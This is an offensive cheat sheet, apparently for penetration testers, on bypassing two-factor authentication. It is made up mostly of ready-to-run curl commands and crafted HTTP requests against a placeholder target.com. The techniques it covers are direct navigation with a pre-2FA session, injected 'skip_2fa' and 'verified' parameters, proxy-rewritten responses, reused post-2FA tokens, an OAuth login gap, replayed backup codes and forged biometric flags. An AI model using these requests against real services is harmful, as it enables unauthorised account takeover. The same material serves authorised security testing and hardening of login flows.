# 2FA Skip

## Summary
Bypassing two-factor authentication by exploiting direct navigation, parameter manipulation, or session reuse.

## Direct Navigation

```bash
# After login but before 2FA, try accessing authenticated pages directly
curl -b "session=abc123" https://target.com/dashboard
curl -b "session=abc123" https://target.com/account/settings
curl -b "session=abc123" https://target.com/api/userinfo

# If any returns user data without 2FA → bypass!
```

## Parameter Manipulation

```bash
# Look for boolean or status params related to 2FA
POST /api/login
{"username": "admin", "password": "secret", "2fa_verified": true}

POST /api/2fa/verify
{"code": "123456", "skip_2fa": true}

POST /api/session
{"2fa_required": false, "2fa_completed": true}

# Try adding 2FA-related parameters even to requests that don't normally have them
GET /dashboard?2fa=done
GET /dashboard?2fa_skip=1
GET /dashboard?verified=true
```

## Response Manipulation

```bash
# If 2FA check is done via client-side JavaScript:
# Intercept the 2FA verification response and modify it

# Original response:
{"success": false, "message": "Invalid code"}

# Modified response:
{"success": true, "redirect": "/dashboard"}

# Use Burp or a proxy to intercept and modify
```

## Session Reuse / Token Reuse

```bash
# If 2FA issues a temporary token, try reusing it multiple times

# Step 1: Complete 2FA once, capture the post-2FA session token
# Step 2: Log out, log in again, reuse the old post-2FA token
# Step 3: If the server does not invalidate old tokens → bypass

curl -b "session=old_post_2fa_session" https://target.com/dashboard
```

## OAuth / Social Login 2FA Gap

```bash
# If the app requires 2FA for direct login but not for OAuth:
# Login via Google/GitHub/etc. to bypass 2FA requirement

curl "https://target.com/oauth/login?provider=google&redirect=/dashboard"
# If this grants access without 2FA prompt → bypass
```

## Backup Code Abuse

```bash
# If backup codes have no usage tracking:
# Use the same backup code multiple times

POST /api/2fa/verify
{"code": "ABCD-EFGH-1234"}  # Use multiple times

# If backup codes are single-use but not tracked server-side:
# Generate many backup codes and use them all
```

## Biometric 2FA Weakness

```bash
# If app checks "is_biometric_enabled" from client:
# Intercept and modify the response

# Original: {"biometric_enabled": false}
# Modified: {"biometric_enabled": true, "biometric_verified": true}
```

